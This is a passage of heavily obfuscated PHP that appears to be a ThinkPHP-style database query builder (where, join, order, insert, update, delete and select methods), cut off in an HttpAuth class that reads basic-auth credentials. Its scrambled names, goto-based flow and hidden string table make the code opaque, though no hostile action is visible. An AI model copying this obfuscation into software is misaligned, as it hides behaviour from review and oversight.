$Fç³†ÍË•¹ = trim($Fç³†ÍË•¹); if (strpos($Fç³†ÍË•¹, $e½°¡é®èî[271])) { $A°áÆÄÚÓ± = explode($e½°¡é®èî[271], $Fç³†ÍË•¹); $aÓô¬©öøõ = array(); foreach ($A°áÆÄÚÓ± as $fêßÑŞÜË® => $A¬‡øëšÍ˜) { $Cî™Œ¯¥± = $F«±’¢²¬‡ ? $e¿”¹…ƒ…‡[$fêßÑŞÜË®] : $e¿”¹…ƒ…‡; $aÓô¬©öøõ[] = $e½°¡é®èî[248] . $this->parseWhereItem($this->parseKey($A¬‡øëšÍ˜), $Cî™Œ¯¥±) . $e½°¡é®èî[819]; } $e´ßßÌõù” .= implode($e½°¡é®èî[925], $aÓô¬©öøõ); } elseif (strpos($Fç³†ÍË•¹, $e½°¡é®èî[272])) { $A°áÆÄÚÓ± = explode($e½°¡é®èî[272], $Fç³†ÍË•¹); $aÓô¬©öøõ = array(); foreach ($A°áÆÄÚÓ± as $fêßÑŞÜË® => $A¬‡øëšÍ˜) { $Cî™Œ¯¥± = $F«±’¢²¬‡ ? $e¿”¹…ƒ…‡[$fêßÑŞÜË®] : $e¿”¹…ƒ…‡; $aÓô¬©öøõ[] = $e½°¡é®èî[248] . $this->parseWhereItem($this->parseKey($A¬‡øëšÍ˜), $Cî™Œ¯¥±) . $e½°¡é®èî[819]; } $e´ßßÌõù” .= implode($e½°¡é®èî[920], $aÓô¬©öøõ); } else { $e´ßßÌõù” .= $this->parseWhereItem($this->parseKey($Fç³†ÍË•¹), $e¿”¹…ƒ…‡); } } $e´ßßÌõù” .= $e½°¡é®èî[266] . $C«µ»¨Ş Ê; } $e´ßßÌõù” = substr($e´ßßÌõù”, 0, -strlen($C«µ»¨Ş Ê)); } return empty($e´ßßÌõù”) ? $e½°¡é®èî[33] : $e½°¡é®èî[926] . $e´ßßÌõù”; } protected function parseWhereItem($CƒŞ‹ŒÁ‰Æ, $D›Åğà×Ê®) { $bÒ½ÀŸ‚æ‘ =& $_SERVER[¦·]; $bèÎá¶èŒ“ = $bÒ½ÀŸ‚æ‘[33]; if (is_array($D›Åğà×Ê®)) { if (is_string($D›Åğà×Ê®[0])) { $B×¥ÆƒŞÑÍ = strtolower($D›Åğà×Ê®[0]); if (in_array($D›Åğà×Ê®[0], array($bÒ½ÀŸ‚æ‘[909], $bÒ½ÀŸ‚æ‘[927], $bÒ½ÀŸ‚æ‘[928], $bÒ½ÀŸ‚æ‘[929], $bÒ½ÀŸ‚æ‘[930], $bÒ½ÀŸ‚æ‘[931]))) { $bèÎá¶èŒ“ .= $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $D›Åğà×Ê®[0] . $bÒ½ÀŸ‚æ‘[50] . $this->parseValue($D›Åğà×Ê®[1]); } elseif (preg_match($bÒ½ÀŸ‚æ‘[932], $D›Åğà×Ê®[0])) { $bèÎá¶èŒ“ .= $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $this->exp[$B×¥ÆƒŞÑÍ] . $bÒ½ÀŸ‚æ‘[50] . $this->parseValue($D›Åğà×Ê®[1]); } elseif (preg_match($bÒ½ÀŸ‚æ‘[933], $D›Åğà×Ê®[0])) { if (is_array($D›Åğà×Ê®[1])) { $BÈÕ¨‘ï¾Ó = isset($D›Åğà×Ê®[2]) ? strtoupper($D›Åğà×Ê®[2]) : $bÒ½ÀŸ‚æ‘[918]; if (in_array($BÈÕ¨‘ï¾Ó, array($bÒ½ÀŸ‚æ‘[917], $bÒ½ÀŸ‚æ‘[918], $bÒ½ÀŸ‚æ‘[919]))) { $dÔ´Ëòíï = array(); foreach ($D›Åğà×Ê®[1] as $E½Ã•ÙÈé®) { $dÔ´Ëòíï[] = $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $this->exp[$B×¥ÆƒŞÑÍ] . $bÒ½ÀŸ‚æ‘[50] . $this->parseValue($E½Ã•ÙÈé®); } $bèÎá¶èŒ“ .= $bÒ½ÀŸ‚æ‘[248] . implode($bÒ½ÀŸ‚æ‘[50] . $BÈÕ¨‘ï¾Ó . $bÒ½ÀŸ‚æ‘[50], $dÔ´Ëòíï) . $bÒ½ÀŸ‚æ‘[819]; } } else { $bèÎá¶èŒ“ .= $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $this->exp[$B×¥ÆƒŞÑÍ] . $bÒ½ÀŸ‚æ‘[50] . $this->parseValue($D›Åğà×Ê®[1]); } } elseif ($bÒ½ÀŸ‚æ‘[285] == $B×¥ÆƒŞÑÍ) { $bèÎá¶èŒ“ .= $bÒ½ÀŸ‚æ‘[817] . $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $D›Åğà×Ê®[1] . $bÒ½ÀŸ‚æ‘[934]; } elseif (preg_match($bÒ½ÀŸ‚æ‘[935], $D›Åğà×Ê®[0])) { if (isset($D›Åğà×Ê®[2]) && $bÒ½ÀŸ‚æ‘[285] == $D›Åğà×Ê®[2]) { $bèÎá¶èŒ“ .= $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $this->exp[$B×¥ÆƒŞÑÍ] . $bÒ½ÀŸ‚æ‘[50] . $D›Åğà×Ê®[1]; } else { if (is_string($D›Åğà×Ê®[1])) { $D›Åğà×Ê®[1] = explode($bÒ½ÀŸ‚æ‘[47], $D›Åğà×Ê®[1]); } $d‚Õ»ÆÕ‹ = implode($bÒ½ÀŸ‚æ‘[47], $this->parseValue($D›Åğà×Ê®[1])); $bèÎá¶èŒ“ .= $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $this->exp[$B×¥ÆƒŞÑÍ] . $bÒ½ÀŸ‚æ‘[817] . $d‚Õ»ÆÕ‹ . $bÒ½ÀŸ‚æ‘[819]; } } elseif (preg_match($bÒ½ÀŸ‚æ‘[936], $D›Åğà×Ê®[0])) { $eª’ßõ·ŠÄ = is_string($D›Åğà×Ê®[1]) ? explode($bÒ½ÀŸ‚æ‘[47], $D›Åğà×Ê®[1]) : $D›Åğà×Ê®[1]; $bèÎá¶èŒ“ .= $bÒ½ÀŸ‚æ‘[817] . $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $this->exp[$B×¥ÆƒŞÑÍ] . $bÒ½ÀŸ‚æ‘[50] . $this->parseValue($eª’ßõ·ŠÄ[0]) . $bÒ½ÀŸ‚æ‘[920] . $this->parseValue($eª’ßõ·ŠÄ[1]) . $bÒ½ÀŸ‚æ‘[266]; } else { think_exception(think_lang($bÒ½ÀŸ‚æ‘[923]) . $bÒ½ÀŸ‚æ‘[4] . $D›Åğà×Ê®[0]); } } else { $B¿ñŞô’÷§ = count($D›Åğà×Ê®); $e£‘Á·Ì = isset($D›Åğà×Ê®[$B¿ñŞô’÷§ - 1]) ? strtoupper($D›Åğà×Ê®[$B¿ñŞô’÷§ - 1]) : $bÒ½ÀŸ‚æ‘[33]; if (in_array($e£‘Á·Ì, array($bÒ½ÀŸ‚æ‘[917], $bÒ½ÀŸ‚æ‘[918], $bÒ½ÀŸ‚æ‘[919]))) { $B¿ñŞô’÷§ = $B¿ñŞô’÷§ - 1; } else { $e£‘Á·Ì = $bÒ½ÀŸ‚æ‘[917]; } for ($aäŞÇ£Ú°î = 0; $aäŞÇ£Ú°î < $B¿ñŞô’÷§; $aäŞÇ£Ú°î++) { $eª’ßõ·ŠÄ = is_array($D›Åğà×Ê®[$aäŞÇ£Ú°î]) ? $D›Åğà×Ê®[$aäŞÇ£Ú°î][1] : $D›Åğà×Ê®[$aäŞÇ£Ú°î]; if ($bÒ½ÀŸ‚æ‘[285] == strtolower($D›Åğà×Ê®[$aäŞÇ£Ú°î][0])) { $bèÎá¶èŒ“ .= $bÒ½ÀŸ‚æ‘[248] . $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $eª’ßõ·ŠÄ . $bÒ½ÀŸ‚æ‘[934] . $e£‘Á·Ì . $bÒ½ÀŸ‚æ‘[50]; } else { $Fß¥óô‚Ì = is_array($D›Åğà×Ê®[$aäŞÇ£Ú°î]) ? $this->exp[strtolower($D›Åğà×Ê®[$aäŞÇ£Ú°î][0])] : $bÒ½ÀŸ‚æ‘[909]; if (!$Fß¥óô‚Ì && is_array($D›Åğà×Ê®[$aäŞÇ£Ú°î]) && in_array($D›Åğà×Ê®[$aäŞÇ£Ú°î][0], array($bÒ½ÀŸ‚æ‘[909], $bÒ½ÀŸ‚æ‘[927], $bÒ½ÀŸ‚æ‘[928], $bÒ½ÀŸ‚æ‘[929], $bÒ½ÀŸ‚æ‘[930], $bÒ½ÀŸ‚æ‘[931]))) { $Fß¥óô‚Ì = $D›Åğà×Ê®[$aäŞÇ£Ú°î][0]; } $bèÎá¶èŒ“ .= $bÒ½ÀŸ‚æ‘[248] . $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[50] . $Fß¥óô‚Ì . $bÒ½ÀŸ‚æ‘[50] . $this->parseValue($eª’ßõ·ŠÄ) . $bÒ½ÀŸ‚æ‘[934] . $e£‘Á·Ì . $bÒ½ÀŸ‚æ‘[50]; } } $bèÎá¶èŒ“ = substr($bèÎá¶èŒ“, 0, -4); } } else { $bèÎá¶èŒ“ .= $CƒŞ‹ŒÁ‰Æ . $bÒ½ÀŸ‚æ‘[937] . $this->parseValue($D›Åğà×Ê®); } return $bèÎá¶èŒ“; } protected function parseThinkWhere($dÂ¬Æº¸–, $fÏÊ¥¾‡áÃ) { $F™…°×ğ£„ =& $_SERVER[¦·]; $A­°×˜Š¹ = $F™…°×ğ£„[33]; switch ($dÂ¬Æº¸–) { case $F™…°×ğ£„[339]: $A­°×˜Š¹ = $fÏÊ¥¾‡áÃ; break; case $F™…°×ğ£„[921]: $A­°×˜Š¹ = is_string($fÏÊ¥¾‡áÃ) ? $fÏÊ¥¾‡áÃ : substr($this->parseWhere($fÏÊ¥¾‡áÃ), 6); break; case $F™…°×ğ£„[938]: parse_str($fÏÊ¥¾‡áÃ, $bœ‰¯Ú­Û½); if (isset($bœ‰¯Ú­Û½[$F™…°×ğ£„[916]])) { $b¨¯å¹ò  = $F™…°×ğ£„[50] . strtoupper($bœ‰¯Ú­Û½[$F™…°×ğ£„[916]]) . $F™…°×ğ£„[50]; unset($bœ‰¯Ú­Û½[$F™…°×ğ£„[916]]); } else { $b¨¯å¹ò  = $F™…°×ğ£„[920]; } $F…Œ´‚¢Î = array(); foreach ($bœ‰¯Ú­Û½ as $E¸Üê‚•« => $c…¦Ú¬ø¡) { $F…Œ´‚¢Î[] = $this->parseKey($E¸Üê‚•«) . $F™…°×ğ£„[937] . $this->parseValue($c…¦Ú¬ø¡); } $A­°×˜Š¹ = implode($b¨¯å¹ò , $F…Œ´‚¢Î); break; } return $A­°×˜Š¹; } protected function parseLimit($BË”Ç†ÈƒŒ) { $båôŠ×‡¾Ó =& $_SERVER[¦·]; return !empty($BË”Ç†ÈƒŒ) ? $båôŠ×‡¾Ó[48] . $BË”Ç†ÈƒŒ . $båôŠ×‡¾Ó[50] : $båôŠ×‡¾Ó[33]; } protected function parseJoin($d‚çˆ¢„Á) { $Cáˆ‚îÉ¾ =& $_SERVER[¦·]; $EÛÆ„©§·Œ = $Cáˆ‚îÉ¾[33]; if (!empty($d‚çˆ¢„Á)) { if (is_array($d‚çˆ¢„Á)) { foreach ($d‚çˆ¢„Á as $a±‰–ˆ«Ì => $D³‚Ñ˜‹¦) { if (!1 !== stripos($D³‚Ñ˜‹¦, $Cáˆ‚îÉ¾[939])) { $EÛÆ„©§·Œ .= $Cáˆ‚îÉ¾[50] . $D³‚Ñ˜‹¦; } else { $EÛÆ„©§·Œ .= $Cáˆ‚îÉ¾[940] . $D³‚Ñ˜‹¦; } } } else { $EÛÆ„©§·Œ .= $Cáˆ‚îÉ¾[940] . $d‚çˆ¢„Á; } } $EÛÆ„©§·Œ = preg_replace($Cáˆ‚îÉ¾[941], think_config($Cáˆ‚îÉ¾[844]) . $Cáˆ‚îÉ¾[942], $EÛÆ„©§·Œ); return $EÛÆ„©§·Œ; } protected function parseOrder($c‘¨ê™¬) { $AîÁôâƒ»‘ =& $_SERVER[¦·]; if (is_array($c‘¨ê™¬)) { $cöÜ–´ì‚À = array(); foreach ($c‘¨ê™¬ as $c‰ÍŒñµÃ => $EôäÑãÛ®Š) { if (is_numeric($c‰ÍŒñµÃ)) { $cöÜ–´ì‚À[] = $this->parseKey($EôäÑãÛ®Š); } else { $EôäÑãÛ®Š = in_array(strtoupper(trim($EôäÑãÛ®Š)), array($AîÁôâƒ»‘[943], $AîÁôâƒ»‘[944])) ? $AîÁôâƒ»‘[50] . $EôäÑãÛ®Š : $AîÁôâƒ»‘[33]; if (preg_match($AîÁôâƒ»‘[945], $c‰ÍŒñµÃ)) { $cöÜ–´ì‚À[] = $this->parseKey($c‰ÍŒñµÃ) . $EôäÑãÛ®Š; } else { think_exception($AîÁôâƒ»‘[946] . $c‰ÍŒñµÃ); } } } $c‘¨ê™¬ = implode($AîÁôâƒ»‘[47], $cöÜ–´ì‚À); } return !empty($c‘¨ê™¬) ? $AîÁôâƒ»‘[947] . $c‘¨ê™¬ : $AîÁôâƒ»‘[33]; } protected function parseGroup($eÃ©Ş¿ÛË‚) { $B‘®í…À¹Õ =& $_SERVER[¦·]; return !empty($eÃ©Ş¿ÛË‚) ? $B‘®í…À¹Õ[948] . $eÃ©Ş¿ÛË‚ : $B‘®í…À¹Õ[33]; } protected function parseHaving($a¹å¶È¨Ö) { $BÌ†ìí‰ÚÙ =& $_SERVER[¦·]; return !empty($a¹å¶È¨Ö) ? $BÌ†ìí‰ÚÙ[949] . $a¹å¶È¨Ö : $BÌ†ìí‰ÚÙ[33]; } protected function parseComment($dÆÒ¶ó÷Èğ) { $Eï±¯‡«àÂ =& $_SERVER[¦·]; return !empty($dÆÒ¶ó÷Èğ) ? $Eï±¯‡«àÂ[950] . $dÆÒ¶ó÷Èğ . $Eï±¯‡«àÂ[951] : $Eï±¯‡«àÂ[33]; } protected function parseDistinct($fˆ¢äË†‹) { $f—Ì…Ò½ñã =& $_SERVER[¦·]; return !empty($fˆ¢äË†‹) ? $f—Ì…Ò½ñã[952] : $f—Ì…Ò½ñã[33]; } protected function parseUnion($e²ƒ‡ƒ¡ª¬) { $FêŸÈ„æ® =& $_SERVER[¦·]; if (empty($e²ƒ‡ƒ¡ª¬)) { return $FêŸÈ„æ®[33]; } if (isset($e²ƒ‡ƒ¡ª¬[$FêŸÈ„æ®[336]])) { $AÔºŞ¤ø¸¹ = $FêŸÈ„æ®[953]; unset($e²ƒ‡ƒ¡ª¬[$FêŸÈ„æ®[336]]); } else { $AÔºŞ¤ø¸¹ = $FêŸÈ„æ®[954]; } foreach ($e²ƒ‡ƒ¡ª¬ as $aßÊ‰ÔÇ­) { $a½µÓ˜îÉ[] = $AÔºŞ¤ø¸¹ . (is_array($aßÊ‰ÔÇ­) ? $this->buildSelectSql($aßÊ‰ÔÇ­) : $aßÊ‰ÔÇ­); } return implode($FêŸÈ„æ®[50], $a½µÓ˜îÉ); } public function insert($Aè Ã‚Å’», $cùÌ¥®©¾ğ = array(), $E—×‹‘ßêé = false) { goto d¸£À§¿à¹; e¶ó«Ş«‡ê: foreach ($Aè Ã‚Å’» as $b‘ä„öš„• => $cÈÃïÇåÂ›) { if (is_array($cÈÃïÇåÂ›) && $f×¹ñÙ‹ŠÔ[285] == $cÈÃïÇåÂ›[0]) { $AÎ‡´—åí[] = $this->parseKey($b‘ä„öš„•); $c†ğ­‰ÉÇ™[] = $cÈÃïÇåÂ›[1]; } elseif (is_scalar($cÈÃïÇåÂ›) || is_null($cÈÃïÇåÂ›)) { $AÎ‡´—åí[] = $this->parseKey($b‘ä„öš„•); $c†ğ­‰ÉÇ™[] = $this->parseValue($cÈÃïÇåÂ›); } } $D‹‰ÂŞ÷µô = ($E—×‹‘ßêé ? $f×¹ñÙ‹ŠÔ[821] : $f×¹ñÙ‹ŠÔ[822]) . $f×¹ñÙ‹ŠÔ[823] . $this->parseTable($cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[267]]) . $f×¹ñÙ‹ŠÔ[817] . implode($f×¹ñÙ‹ŠÔ[47], $AÎ‡´—åí) . $f×¹ñÙ‹ŠÔ[818] . implode($f×¹ñÙ‹ŠÔ[47], $c†ğ­‰ÉÇ™) . $f×¹ñÙ‹ŠÔ[819]; $D‹‰ÂŞ÷µô .= $this->parseLock(isset($cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[772]]) ? $cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[772]] : !1); goto bÒï›‰õ‡•; bÒï›‰õ‡•: $D‹‰ÂŞ÷µô .= $this->parseComment(!empty($cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[341]]) ? $cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[341]] : $f×¹ñÙ‹ŠÔ[33]); return $this->execute($D‹‰ÂŞ÷µô, $this->parseBind(!empty($cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[273]]) ? $cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[273]] : array())); goto B¨œÜ¹‚Â×; d¸£À§¿à¹: $f×¹ñÙ‹ŠÔ =& $_SERVER[¦·]; $c†ğ­‰ÉÇ™ = $AÎ‡´—åí = array(); $this->model = $cùÌ¥®©¾ğ[$f×¹ñÙ‹ŠÔ[269]]; goto e¶ó«Ş«‡ê; B¨œÜ¹‚Â×: } public function selectInsert($Bç¦’’ºÙÖ, $Fñø—øçõ›, $c„µˆ›‡ = array()) { goto aÃ˜¸ó´ù; aÃ˜¸ó´ù: $C‡³„ÀôÔ¸ =& $_SERVER[¦·]; $this->model = $c„µˆ›‡[$C‡³„ÀôÔ¸[269]]; if (is_string($Bç¦’’ºÙÖ)) { $Bç¦’’ºÙÖ = explode($C‡³„ÀôÔ¸[47], $Bç¦’’ºÙÖ); } goto A¬¥´¦××; A¬¥´¦××: array_walk($Bç¦’’ºÙÖ, array($this, $C‡³„ÀôÔ¸[820])); $B®ÆÉ½ˆî = $C‡³„ÀôÔ¸[955] . $this->parseTable($Fñø—øçõ›) . $C‡³„ÀôÔ¸[817] . implode($C‡³„ÀôÔ¸[47], $Bç¦’’ºÙÖ) . $C‡³„ÀôÔ¸[934]; $B®ÆÉ½ˆî .= $this->buildSelectSql($c„µˆ›‡); goto eÍÏô¨ÙôŸ; eÍÏô¨ÙôŸ: return $this->execute($B®ÆÉ½ˆî, $this->parseBind(!empty($c„µˆ›‡[$C‡³„ÀôÔ¸[273]]) ? $c„µˆ›‡[$C‡³„ÀôÔ¸[273]] : array())); goto FšôÍĞõÔ; FšôÍĞõÔ: } public function update($f¾¢Ê‘‹»Ö, $AÏ“Úº…Ò) { $a¤î„Û½Ä§ =& $_SERVER[¦·]; $this->model = $AÏ“Úº…Ò[$a¤î„Û½Ä§[269]]; $cƒôŸµ°ˆ = $a¤î„Û½Ä§[956] . $this->parseTable($AÏ“Úº…Ò[$a¤î„Û½Ä§[267]]) . $this->parseSet($f¾¢Ê‘‹»Ö) . $this->parseWhere(!empty($AÏ“Úº…Ò[$a¤î„Û½Ä§[263]]) ? $AÏ“Úº…Ò[$a¤î„Û½Ä§[263]] : $a¤î„Û½Ä§[33]) . $this->parseOrder(!empty($AÏ“Úº…Ò[$a¤î„Û½Ä§[350]]) ? $AÏ“Úº…Ò[$a¤î„Û½Ä§[350]] : $a¤î„Û½Ä§[33]) . $this->parseLimit(!empty($AÏ“Úº…Ò[$a¤î„Û½Ä§[280]]) ? $AÏ“Úº…Ò[$a¤î„Û½Ä§[280]] : $a¤î„Û½Ä§[33]) . $this->parseLock(isset($AÏ“Úº…Ò[$a¤î„Û½Ä§[772]]) ? $AÏ“Úº…Ò[$a¤î„Û½Ä§[772]] : !1) . $this->parseComment(!empty($AÏ“Úº…Ò[$a¤î„Û½Ä§[341]]) ? $AÏ“Úº…Ò[$a¤î„Û½Ä§[341]] : $a¤î„Û½Ä§[33]); return $this->execute($cƒôŸµ°ˆ, $this->parseBind(!empty($AÏ“Úº…Ò[$a¤î„Û½Ä§[273]]) ? $AÏ“Úº…Ò[$a¤î„Û½Ä§[273]] : array())); } public function delete($EÜ †‰£ô‘ = array()) { $dî·–‰ßÚ™ =& $_SERVER[¦·]; $this->model = $EÜ †‰£ô‘[$dî·–‰ßÚ™[269]]; $A±——©ƒ½´ = $dî·–‰ßÚ™[957] . $this->parseTable($EÜ †‰£ô‘[$dî·–‰ßÚ™[267]]) . $this->parseWhere(!empty($EÜ †‰£ô‘[$dî·–‰ßÚ™[263]]) ? $EÜ †‰£ô‘[$dî·–‰ßÚ™[263]] : $dî·–‰ßÚ™[33]) . $this->parseOrder(!empty($EÜ †‰£ô‘[$dî·–‰ßÚ™[350]]) ? $EÜ †‰£ô‘[$dî·–‰ßÚ™[350]] : $dî·–‰ßÚ™[33]) . $this->parseLimit(!empty($EÜ †‰£ô‘[$dî·–‰ßÚ™[280]]) ? $EÜ †‰£ô‘[$dî·–‰ßÚ™[280]] : $dî·–‰ßÚ™[33]) . $this->parseLock(isset($EÜ †‰£ô‘[$dî·–‰ßÚ™[772]]) ? $EÜ †‰£ô‘[$dî·–‰ßÚ™[772]] : !1) . $this->parseComment(!empty($EÜ †‰£ô‘[$dî·–‰ßÚ™[341]]) ? $EÜ †‰£ô‘[$dî·–‰ßÚ™[341]] : $dî·–‰ßÚ™[33]); return $this->execute($A±——©ƒ½´, $this->parseBind(!empty($EÜ †‰£ô‘[$dî·–‰ßÚ™[273]]) ? $EÜ †‰£ô‘[$dî·–‰ßÚ™[273]] : array())); } public function select($D©“…„Ì« = array()) { goto E´Ö«óç; bğ½‘ÔÀ…: if ($aˆÒÙÉˆšë && !1 !== $BåœŞŒÕÛö) { think_cache($fÏò‰¦ßÎØ, $BåœŞŒÕÛö, $aˆÒÙÉˆšë); } return $BåœŞŒÕÛö; goto c÷¬ö¿ö•À; DÌ§Ñ³¬›: $aˆÒÙÉˆšë = isset($D©“…„Ì«[$Bô—íî¹–[337]]) ? $D©“…„Ì«[$Bô—íî¹–[337]] : !1; if ($aˆÒÙÉˆšë) { $fÏò‰¦ßÎØ = is_string($aˆÒÙÉˆšë[$Bô—íî¹–[89]]) ? $aˆÒÙÉˆšë[$Bô—íî¹–[89]] : $Bô—íî¹–[958] . md5($B‹ëŞİÅù); $b¡¯ÅØŠ = think_cache($fÏò‰¦ßÎØ, $Bô—íî¹–[33], $aˆÒÙÉˆšë); if (!1 !== $b¡¯ÅØŠ) { return $b¡¯ÅØŠ; } } $BåœŞŒÕÛö = $this->query($B‹ëŞİÅù, $this->parseBind(!empty($D©“…„Ì«[$Bô—íî¹–[273]]) ? $D©“…„Ì«[$Bô—íî¹–[273]] : array())); goto bğ½‘ÔÀ…; E´Ö«óç: $Bô—íî¹– =& $_SERVER[¦·]; $this->model = $D©“…„Ì«[$Bô—íî¹–[269]]; $B‹ëŞİÅù = $this->buildSelectSql($D©“…„Ì«); goto DÌ§Ñ³¬›; c÷¬ö¿ö•À: } public function buildSelectSql($A×¾¦¯Ü› = array()) { goto F‰Ü¤ŞÇÓ; f£‚ÂÎÅ±: $C«õ‡Á¢‰é = $this->parseSql($this->selectSql, $A×¾¦¯Ü›); $C«õ‡Á¢‰é .= $this->parseLock(isset($A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[772]]) ? $A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[772]] : !1); if (isset($AåÂ Ô¼Ø)) { think_cache($AåÂ Ô¼Ø, $C«õ‡Á¢‰é); } goto EÄÒ§ô‘Î ; EÄÒ§ô‘Î : return $C«õ‡Á¢‰é; goto f‘„¶¤“ëœ; F‰Ü¤ŞÇÓ: $b‘ƒŒ¸ÓË© =& $_SERVER[¦·]; if (isset($A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[340]])) { if (strpos($A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[340]], $b‘ƒŒ¸ÓË©[47])) { list($dÖ¸Øä¿ä, $E©°‹Ë°Ãù) = explode($b‘ƒŒ¸ÓË©[47], $A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[340]]); } else { $dÖ¸Øä¿ä = $A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[340]]; } $dÖ¸Øä¿ä = $dÖ¸Øä¿ä ? $dÖ¸Øä¿ä : 1; $E©°‹Ë°Ãù = isset($E©°‹Ë°Ãù) ? $E©°‹Ë°Ãù : (is_numeric($A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[280]]) ? $A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[280]] : 20); $dµ‚¯¤ùéß = $E©°‹Ë°Ãù * ((int) $dÖ¸Øä¿ä - 1); $A×¾¦¯Ü›[$b‘ƒŒ¸ÓË©[280]] = $dµ‚¯¤ùéß . $b‘ƒŒ¸ÓË©[47] . $E©°‹Ë°Ãù; } if (think_config($b‘ƒŒ¸ÓË©[959])) { $AåÂ Ô¼Ø = $b‘ƒŒ¸ÓË©[960] . md5(serialize($A×¾¦¯Ü›)); $BŠ¡Ê½èÏ = think_cache($AåÂ Ô¼Ø); if ($BŠ¡Ê½èÏ) { return $BŠ¡Ê½èÏ; } } goto f£‚ÂÎÅ±; f‘„¶¤“ëœ: } public function parseSql($cÜŞ‡Ê¥¦†, $f°ääÄ•ÊÒ = array()) { $fÖÚ²õ×™¹ =& $_SERVER[¦·]; $cÜŞ‡Ê¥¦† = str_replace(array($fÖÚ²õ×™¹[961], $fÖÚ²õ×™¹[962], $fÖÚ²õ×™¹[963], $fÖÚ²õ×™¹[964], $fÖÚ²õ×™¹[965], $fÖÚ²õ×™¹[966], $fÖÚ²õ×™¹[967], $fÖÚ²õ×™¹[968], $fÖÚ²õ×™¹[969], $fÖÚ²õ×™¹[970], $fÖÚ²õ×™¹[971]), array($this->parseTable("{$f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[267]]}"), $this->parseDistinct(isset($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[972]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[972]] : !1), $this->parseField(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[261]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[261]] : $fÖÚ²õ×™¹[176]), $this->parseJoin(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[270]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[270]] : $fÖÚ²õ×™¹[33]), $this->parseWhere(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[263]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[263]] : $fÖÚ²õ×™¹[33]), $this->parseGroup(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[973]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[973]] : $fÖÚ²õ×™¹[33]), $this->parseHaving(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[974]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[974]] : $fÖÚ²õ×™¹[33]), $this->parseOrder(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[350]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[350]] : $fÖÚ²õ×™¹[33]), $this->parseLimit(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[280]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[280]] : $fÖÚ²õ×™¹[33]), $this->parseUnion(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[335]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[335]] : $fÖÚ²õ×™¹[33]), $this->parseComment(!empty($f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[341]]) ? $f°ääÄ•ÊÒ[$fÖÚ²õ×™¹[341]] : $fÖÚ²õ×™¹[33])), $cÜŞ‡Ê¥¦†); return $cÜŞ‡Ê¥¦†; } public function getLastSql($aİ˜”¸Çì = '') { return $aİ˜”¸Çì ? $this->modelSql[$aİ˜”¸Çì] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($e‡¤Š‚®ä½) { return addslashes($e‡¤Š‚®ä½); } public function setModel($aÇº°Ñ¯´Ù) { $this->model = $aÇº°Ñ¯´Ù; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto DÏ¼¬¿½ê¨; bÏ‚åÅ÷ÉŠ: class HttpAuth { public static function get() { $còŞŠ¤ ÅÀ =& $_SERVER[¦·]; $AâğÈ®¼­ = $còŞŠ¤ ÅÀ[33]; $a‰¬ğŠí… = $còŞŠ¤ ÅÀ[33]; if (isset($_SERVER[$còŞŠ¤ ÅÀ[1765]])) { $AâğÈ®¼­ = $_SERVER[$còŞŠ¤ ÅÀ[1765]]; $a‰¬ğŠí… = $_SERVER[$còŞŠ¤ ÅÀ[1766]]; } elseif (isset($_SERVER[$còŞŠ¤ ÅÀ[1767]])) { $b„ÑÂÃ ¯Œ = $_SERVER[$còŞŠ¤ ÅÀ[1767]]; if (strpos(strtolower($b„ÑÂÃ ¯Œ), $còŞŠ¤ ÅÀ[1768]) === 0) { $A½Ó…‡åŒî = explode($còŞŠ¤ ÅÀ[4], base64_decode(substr($b„ÑÂÃ ¯Œ, 6))); $AâğÈ®¼­ = isset($A½Ó…‡åŒî[0]) ? $A½Ó…‡åŒî[0] : $còŞŠ¤ 